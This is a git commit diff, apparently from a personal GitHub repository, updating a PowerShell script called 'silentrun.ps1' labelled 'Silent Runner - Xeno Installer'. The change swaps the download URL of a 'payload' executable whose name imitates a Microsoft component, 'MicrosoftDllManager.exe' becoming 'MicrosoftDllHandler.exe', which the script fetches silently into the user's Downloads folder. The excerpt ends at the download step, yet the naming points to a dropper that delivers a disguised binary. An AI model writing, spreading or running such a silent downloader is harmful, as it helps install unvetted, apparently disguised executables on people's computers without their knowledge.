28879588879cc92ed5f6b75d5e67b85b29cf0192
Unhiin <133892941+hypnotixx0@users.noreply.github.com>
2026-05-13 18:35:30 -0700

    Update silentrun.ps1

--- silentrun.ps1
+++ silentrun.ps1
@@ -1,6 +1,6 @@
 # Silent Runner - Xeno Installer
-$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllManager.exe"
-$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllManager.exe"
+$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
+$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"
 
 try {
     Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
